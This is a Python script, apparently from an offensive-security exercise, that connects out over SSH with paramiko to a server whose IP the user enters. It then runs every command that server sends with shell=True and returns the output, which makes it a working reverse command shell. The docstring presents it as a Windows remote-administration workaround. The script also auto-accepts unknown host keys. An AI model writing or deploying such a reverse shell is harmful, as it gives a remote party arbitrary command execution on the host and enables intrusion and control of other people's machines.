#!/usr/bin/env python
#!/usr/bin/python3

"""
Modification of ssh_cmd.py script to run commands on the Windows client over SSH.py

Because most versions of Microsoft Windows don't include a SSH server (out of the box), we need to reverse and send commands from a SSH server to the SSH client.
"""

import paramiko
import shlex
import subprocess

def ssh_command (ip:str, port:int, user:str, passwd:str, command:str):
    client = paramiko.SSHClient()

    # bc we control both ends of connection, set policy to accept SSH key for the SSH server we're connecting to and make connection
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active():
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())  # read banner

        while(True):
            # take commands from connection, execute command, send any output back to caller
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

if __name__ == '__main__':
    import getpass

    user = getpass.getuser()
    password = getpass.getpass()

    ip = input('Enter server IP: ')
    assert(ip)
    port = input('Enter port: ') or 2222
    ssh_command(ip, port, user, password, 'ClientConnected')

